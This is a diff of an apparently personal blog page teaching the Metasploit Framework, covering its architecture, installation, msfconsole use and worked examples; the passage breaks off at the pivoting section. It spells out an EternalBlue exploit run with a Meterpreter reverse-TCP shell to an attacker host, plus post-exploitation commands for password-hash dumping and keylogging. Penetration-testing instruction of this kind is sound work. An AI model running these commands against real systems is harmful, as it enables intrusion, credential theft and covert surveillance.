@@ -7,9 +7,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
 <meta name="author" content="Xu Haiyang">
-<meta name="dcterms.date" content="2025-03-06">
+<meta name="dcterms.date" content="2025-03-11">
 
-<title>metasploit – Haiyang's Tech Portfolio</title>
+<title>Metasploit Framework: The Comprehensive Penetration Testing Arsenal – Haiyang’s Tech Portfolio</title>
 <style>
 code{white-space: pre-wrap;}
 span.smallcaps{font-variant: small-caps;}
@@ -21,6 +21,40 @@ ul.task-list li input[type="checkbox"] {
   width: 0.8em;
   margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
   vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
 }
 </style>
 
@@ -155,14 +189,56 @@ ul.task-list li input[type="checkbox"] {
 <div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
 <!-- sidebar -->
 <!-- margin-sidebar -->
-    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
-        
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">Contents</h2>
+   
+  <ul>
+  <li><a href="#introduction-to-metasploit-framework" id="toc-introduction-to-metasploit-framework" class="nav-link active" data-scroll-target="#introduction-to-metasploit-framework">Introduction to Metasploit Framework</a></li>
+  <li><a href="#metasploit-editions" id="toc-metasploit-editions" class="nav-link" data-scroll-target="#metasploit-editions">Metasploit Editions</a></li>
+  <li><a href="#key-components-and-architecture" id="toc-key-components-and-architecture" class="nav-link" data-scroll-target="#key-components-and-architecture">Key Components and Architecture</a>
+  <ul class="collapse">
+  <li><a href="#core-components" id="toc-core-components" class="nav-link" data-scroll-target="#core-components">Core Components</a></li>
+  <li><a href="#module-types" id="toc-module-types" class="nav-link" data-scroll-target="#module-types">Module Types</a></li>
+  </ul></li>
+  <li><a href="#using-metasploit-framework" id="toc-using-metasploit-framework" class="nav-link" data-scroll-target="#using-metasploit-framework">Using Metasploit Framework</a>
+  <ul class="collapse">
+  <li><a href="#installation" id="toc-installation" class="nav-link" data-scroll-target="#installation">Installation</a></li>
+  <li><a href="#basic-workflow" id="toc-basic-workflow" class="nav-link" data-scroll-target="#basic-workflow">Basic Workflow</a></li>
+  <li><a href="#msfconsole-commands" id="toc-msfconsole-commands" class="nav-link" data-scroll-target="#msfconsole-commands">MSFconsole Commands</a></li>
+  </ul></li>
+  <li><a href="#practical-examples" id="toc-practical-examples" class="nav-link" data-scroll-target="#practical-examples">Practical Examples</a>
+  <ul class="collapse">
+  <li><a href="#example-1-vulnerability-scanning-with-metasploit" id="toc-example-1-vulnerability-scanning-with-metasploit" class="nav-link" data-scroll-target="#example-1-vulnerability-scanning-with-metasploit">Example 1: Vulnerability Scanning with Metasploit</a></li>
+  <li><a href="#example-2-exploiting-a-vulnerable-service" id="toc-example-2-exploiting-a-vulnerable-service" class="nav-link" data-scroll-target="#example-2-exploiting-a-vulnerable-service">Example 2: Exploiting a Vulnerable Service</a></li>
+  <li><a href="#example-3-post-exploitation-with-meterpreter" id="toc-example-3-post-exploitation-with-meterpreter" class="nav-link" data-scroll-target="#example-3-post-exploitation-with-meterpreter">Example 3: Post-Exploitation with Meterpreter</a></li>
+  </ul></li>
+  <li><a href="#advanced-metasploit-techniques" id="toc-advanced-metasploit-techniques" class="nav-link" data-scroll-target="#advanced-metasploit-techniques">Advanced Metasploit Techniques</a>
+  <ul class="collapse">
+  <li><a href="#custom-module-development" id="toc-custom-module-development" class="nav-link" data-scroll-target="#custom-module-development">Custom Module Development</a></li>
+  <li><a href="#using-resource-scripts" id="toc-using-resource-scripts" class="nav-link" data-scroll-target="#using-resource-scripts">Using Resource Scripts</a></li>
+  <li><a href="#pivoting-through-networks" id="toc-pivoting-through-networks" class="nav-link" data-scroll-target="#pivoting-through-networks">Pivoting Through Networks</a></li>
+  </ul></li>
+  <li><a href="#integration-with-other-tools" id="toc-integration-with-other-tools" class="nav-link" data-scroll-target="#integration-with-other-tools">Integration with Other Tools</a>
+  <ul class="collapse">
+  <li><a href="#nmap-integration" id="toc-nmap-integration" class="nav-link" data-scroll-target="#nmap-integration">Nmap Integration</a></li>
+  <li><a href="#nexposenessus-integration" id="toc-nexposenessus-integration" class="nav-link" data-scroll-target="#nexposenessus-integration">Nexpose/Nessus Integration</a></li>
+  <li><a href="#powershell-empire-integration" id="toc-powershell-empire-integration" class="nav-link" data-scroll-target="#powershell-empire-integration">PowerShell Empire Integration</a></li>
+  </ul></li>
+  <li><a href="#security-considerations-and-ethics" id="toc-security-considerations-and-ethics" class="nav-link" data-scroll-target="#security-considerations-and-ethics">Security Considerations and Ethics</a></li>
+  <li><a href="#comparison-with-other-exploitation-frameworks" id="toc-comparison-with-other-exploitation-frameworks" class="nav-link" data-scroll-target="#comparison-with-other-exploitation-frameworks">Comparison with Other Exploitation Frameworks</a></li>
+  <li><a href="#defense-against-metasploit" id="toc-defense-against-metasploit" class="nav-link" data-scroll-target="#defense-against-metasploit">Defense Against Metasploit</a></li>
+  <li><a href="#conclusion" id="toc-conclusion" class="nav-link" data-scroll-target="#conclusion">Conclusion</a></li>
+  <li><a href="#resources-for-further-learning" id="toc-resources-for-further-learning" class="nav-link" data-scroll-target="#resources-for-further-learning">Resources for Further Learning</a></li>
+  </ul>
+</nav>
     </div>
 <!-- main -->
 <main class="content" id="quarto-document-content">
 
 <header id="title-block-header" class="quarto-title-block default">
 <div class="quarto-title">
+<h1 class="title">Metasploit Framework: The Comprehensive Penetration Testing Arsenal</h1>
   <div class="quarto-categories">
     <div class="quarto-category">Exploitation</div>
   </div>
@@ -182,7 +258,7 @@ ul.task-list li input[type="checkbox"] {
     <div>
     <div class="quarto-title-meta-heading">Published</div>
     <div class="quarto-title-meta-contents">
-      <p class="date">March 6, 2025</p>
+      <p class="date">March 11, 2025</p>
     </div>
   </div>
   
@@ -194,8 +270,477 @@ ul.task-list li input[type="checkbox"] {
 </header>
 
 
+<section id="introduction-to-metasploit-framework" class="level2">
+<h2 class="anchored" data-anchor-id="introduction-to-metasploit-framework">Introduction to Metasploit Framework</h2>
+<p>The Metasploit Framework is one of the most powerful and widely used penetration testing tools available today. Created by H.D. Moore in 2003, it has evolved into a comprehensive platform that security professionals use to find, exploit, and validate vulnerabilities in various systems and applications.</p>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>Metasploit Framework Console</figcaption>
+</figure>
+</div>
+<p>Metasploit provides a structured environment for penetration testing with a vast collection of exploit code, payload generators, and auxiliary modules designed to streamline security assessments.</p>
+</section>
+<section id="metasploit-editions" class="level2">
+<h2 class="anchored" data-anchor-id="metasploit-editions">Metasploit Editions</h2>
+<p>Metasploit is available in several different editions to meet various needs:</p>
+<ol type="1">
+<li><strong>Metasploit Framework (MSF)</strong> - The free, open-source core framework</li>
+<li><strong>Metasploit Pro</strong> - Commercial version with advanced features for enterprise use</li>
+<li><strong>Metasploit Express</strong> - A simplified commercial version (discontinued)</li>
+<li><strong>Metasploit Community</strong> - Free version with basic GUI interface</li>
+</ol>
+</section>
+<section id="key-components-and-architecture" class="level2">
+<h2 class="anchored" data-anchor-id="key-components-and-architecture">Key Components and Architecture</h2>
+<p>The Metasploit Framework follows a modular architecture that makes it highly extensible and powerful.</p>
+<section id="core-components" class="level3">
+<h3 class="anchored" data-anchor-id="core-components">Core Components</h3>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>Metasploit Architecture</figcaption>
+</figure>
+</div>
+<pre><code>+--------------------+     +--------------------+     +--------------------+
+|      Libraries     | --&gt; |       Core         | &lt;-- |   User Interfaces  |
++--------------------+     +--------------------+     +--------------------+
+                             ^         ^
+                             |         |
+                             v         v
+             +--------------------+  +--------------------+
+             |      Modules      |  |    Tools           |
+             +--------------------+  +--------------------+</code></pre>
+<ul>
+<li><strong>Rex</strong>: The basic library for most tasks like handling sockets, protocols, text transformations, etc.</li>
+<li><strong>MSF Core</strong>: Provides the API that modules are built against</li>
+<li><strong>MSF Base</strong>: Extends the core with additional functionality</li>
+<li><strong>Interfaces</strong>: Command line, console, web interfaces, and GUI</li>
+<li><strong>Modules</strong>: The actual exploits, payloads, and auxiliary functionality</li>
+<li><strong>Tools</strong>: Standalone tools that complement the framework</li>
+</ul>
+</section>
+<section id="module-types" class="level3">
+<h3 class="anchored" data-anchor-id="module-types">Module Types</h3>
+<p>Metasploit organizes its functionality into different module types:</p>
+<div class="callout callout-style-default callout-important callout-titled">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Important
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p>Understanding the different module types is crucial for effective penetration testing with Metasploit.</p>
+</div>
+</div>
+<section id="exploits" class="level4">
+<h4 class="anchored" data-anchor-id="exploits">Exploits</h4>
+<p>Exploits are pieces of code that take advantage of vulnerabilities in systems or applications.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode ruby code-with-copy"><code class="sourceCode ruby"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Example structure of a simple Metasploit exploit module</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="cf">class</span> <span class="dt">MetasploitModule</span> <span class="kw">&lt;</span> <span class="dt">Msf</span><span class="kw">::</span><span class="dt">Exploit</span><span class="kw">::</span><span class="dt">Remote</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">Rank</span> <span class="kw">=</span> <span class="dt">NormalRanking</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">def</span> initialize(info <span class="kw">=</span> <span class="kw">{}</span>)</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="dv">super</span>(update_info(info,</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'Name'</span>           <span class="kw">=&gt;</span> <span class="vs">'Example Vulnerable Service Exploit'</span>,</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'Description'</span>    <span class="kw">=&gt;</span><span class="ot"> %q{</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="vs">        This module exploits a buffer overflow in Example Service.</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="vs">      </span><span class="ot">}</span>,</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'Author'</span>         <span class="kw">=&gt;</span> <span class="kw">[</span><span class="vs">'Security Researcher'</span><span class="kw">]</span>,</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'License'</span>        <span class="kw">=&gt;</span> <span class="cn">MSF_LICENSE</span>,</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'Targets'</span>        <span class="kw">=&gt;</span> <span class="kw">[</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">[</span><span class="vs">'Windows 10'</span>, <span class="kw">{</span><span class="vs">'Ret'</span> <span class="kw">=&gt;</span> <span class="bn">0x41414141</span><span class="kw">}]</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>      <span class="kw">]</span>,</span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'DefaultTarget'</span>  <span class="kw">=&gt;</span> <span class="dv">0</span>,</span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>      <span class="vs">'DisclosureDate'</span> <span class="kw">=&gt;</span> <span class="vs">'2025-01-01'</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>    ))</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">def</span> check</span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Check if target is vulnerable</span></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>  <span class="cf">def</span> exploit</span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Exploit code goes here</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a><span class="cf">end</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="payloads" class="level4">
+<h4 class="anchored" data-anchor-id="payloads">Payloads</h4>
+<p>Payloads are code that runs after successful exploitation. Metasploit offers three types:</p>
+<ol type="1">
+<li><strong>Singles</strong>: Self-contained payloads (add user, execute command)</li>
+<li><strong>Stagers</strong>: Establish a connection channel between attacker and victim</li>
+<li><strong>Stages</strong>: Downloaded by stagers to provide advanced features</li>
+</ol>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>Metasploit Payload Types</figcaption>
+</figure>
+</div>
+</section>
+<section id="auxiliary" class="level4">
+<h4 class="anchored" data-anchor-id="auxiliary">Auxiliary</h4>
+<p>Auxiliary modules perform standalone tasks like scanning, fuzzing, and information gathering.</p>
+</section>
+<section id="post-exploitation" class="level4">
+<h4 class="anchored" data-anchor-id="post-exploitation">Post-Exploitation</h4>
+<p>Post modules are used after successful exploitation to gather information, pivot to other systems, or maintain persistence.</p>
+</section>
+<section id="encoders" class="level4">
+<h4 class="anchored" data-anchor-id="encoders">Encoders</h4>
+<p>Encoders help evade antivirus detection and bypass character restrictions in exploits.</p>
+</section>
+<section id="nops" class="level4">
+<h4 class="anchored" data-anchor-id="nops">NOPs</h4>
+<p>NOP (No Operation) generators create NOP sleds for exploit reliability.</p>
+</section>
+</section>
+</section>
+<section id="using-metasploit-framework" class="level2">
+<h2 class="anchored" data-anchor-id="using-metasploit-framework">Using Metasploit Framework</h2>
+<section id="installation" class="level3">
+<h3 class="anchored" data-anchor-id="installation">Installation</h3>
+<p>Installing Metasploit is straightforward on most platforms:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># On Kali Linux, Metasploit comes pre-installed</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co"># To update:</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install metasploit-framework</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="co"># On other Linux distributions:</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb <span class="op">&gt;</span> msfinstall</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x msfinstall</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> ./msfinstall</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="basic-workflow" class="level3">
+<h3 class="anchored" data-anchor-id="basic-workflow">Basic Workflow</h3>
+<p>The typical workflow using Metasploit involves these steps:</p>
+<pre class="mermaid"><code>graph TD
+    A[Reconnaissance] --&gt; B[Vulnerability Scanning]
+    B --&gt; C[Select Exploit]
+    C --&gt; D[Configure Exploit]
+    D --&gt; E[Select Payload]
+    E --&gt; F[Configure Payload]
+    F --&gt; G[Execute Exploit]
+    G --&gt; H[Post-Exploitation]
+    H --&gt; I[Clean Up]</code></pre>
+</section>
+<section id="msfconsole-commands" class="level3">
+<h3 class="anchored" data-anchor-id="msfconsole-commands">MSFconsole Commands</h3>
+<p>MSFconsole is the main interface for Metasploit. Here are some essential commands:</p>
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>help</code></td>
+<td>Display help menu</td>
+</tr>
+<tr class="even">
+<td><code>search</code></td>
+<td>Search for modules</td>
+</tr>
+<tr class="odd">
+<td><code>use</code></td>
+<td>Select a module to use</td>
+</tr>
+<tr class="even">
+<td><code>info</code></td>
+<td>Display information about a module</td>
+</tr>
+<tr class="odd">
+<td><code>show options</code></td>
+<td>Show available options for current module</td>
+</tr>
+<tr class="even">
+<td><code>set</code></td>
+<td>Set an option’s value</td>
+</tr>
+<tr class="odd">
+<td><code>exploit</code> or <code>run</code></td>
+<td>Execute the selected module</td>
+</tr>
+<tr class="even">
+<td><code>sessions</code></td>
+<td>List active sessions</td>
+</tr>
+<tr class="odd">
+<td><code>background</code></td>
+<td>Background the current session</td>
+</tr>
+<tr class="even">
+<td><code>db_nmap</code></td>
+<td>Run Nmap scan and save to database</td>
+</tr>
+</tbody>
+</table>
+<div class="callout callout-style-default callout-tip callout-titled">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Tip
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p>Use the <code>setg</code> command to set global options that persist across modules.</p>
+</div>
+</div>
+</section>
+</section>
+<section id="practical-examples" class="level2">
+<h2 class="anchored" data-anchor-id="practical-examples">Practical Examples</h2>
+<section id="example-1-vulnerability-scanning-with-metasploit" class="level3">
+<h3 class="anchored" data-anchor-id="example-1-vulnerability-scanning-with-metasploit">Example 1: Vulnerability Scanning with Metasploit</h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Start PostgreSQL service</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl start postgresql</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Initialize the MSF database</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> msfdb init</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Start MSFconsole</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> msfconsole</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Connect to the database</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> db_connect msf:password@127.0.0.1/msf</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Perform a scan</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> db_nmap <span class="at">-sV</span> <span class="at">-p</span> 1-10000 192.168.1.100</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="co"># List discovered hosts</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> hosts</span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="co"># List discovered services</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> services</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>Metasploit Vulnerability Scanning</figcaption>
+</figure>
+</div>
+</section>
+<section id="example-2-exploiting-a-vulnerable-service" class="level3">
+<h3 class="anchored" data-anchor-id="example-2-exploiting-a-vulnerable-service">Example 2: Exploiting a Vulnerable Service</h3>
+<p>This example demonstrates exploiting a vulnerable SMB service using the EternalBlue exploit:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Search for the EternalBlue exploit</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> search eternalblue</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Use the exploit</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Set the required options</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set RHOSTS 192.168.1.100</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set LHOST 192.168.1.50</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Run the exploit</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> exploit</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="example-3-post-exploitation-with-meterpreter" class="level3">
+<h3 class="anchored" data-anchor-id="example-3-post-exploitation-with-meterpreter">Example 3: Post-Exploitation with Meterpreter</h3>
+<p>Once you have a Meterpreter session, you can perform various post-exploitation activities:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># In an active Meterpreter session</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> sysinfo</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> getuid</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> hashdump</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> screenshot</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> keyscan_start</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> search <span class="at">-f</span> <span class="pp">*</span>.pdf</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> migrate 1234</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>Meterpreter Post-Exploitation</figcaption>
+</figure>
+</div>
+</section>
+</section>
+<section id="advanced-metasploit-techniques" class="level2">
+<h2 class="anchored" data-anchor-id="advanced-metasploit-techniques">Advanced Metasploit Techniques</h2>
+<section id="custom-module-development" class="level3">
+<h3 class="anchored" data-anchor-id="custom-module-development">Custom Module Development</h3>
+<p>You can create custom modules for specialized needs:</p>
+<ol type="1">
+<li>Create a new Ruby file in the appropriate module directory</li>
+<li>Define the module class and required methods</li>
+<li>Set metadata like name, description, and authors</li>
+<li>Implement the core functionality</li>
+<li>Test and debug the module</li>
+</ol>
+</section>
+<section id="using-resource-scripts" class="level3">
+<h3 class="anchored" data-anchor-id="using-resource-scripts">Using Resource Scripts</h3>
+<p>Resource scripts automate repetitive tasks in Metasploit:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Create a resource script (automate.rc)</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"use auxiliary/scanner/smb/smb_version"</span> <span class="op">&gt;</span> automate.rc</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"set RHOSTS 192.168.1.0/24"</span> <span class="op">&gt;&gt;</span> automate.rc</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"run"</span> <span class="op">&gt;&gt;</span> automate.rc</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Run the resource script</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> resource automate.rc</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="pivoting-through-networks" class="level3">
+<h3 class="anchored" data-anchor-id="pivoting-through-networks">Pivoting Through Networks</h3>
+<p>Metasploit allows pivoting through compromised hosts to reach otherwise inaccessible networks:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># In a Meterpreter session on a compromised host</span></span>
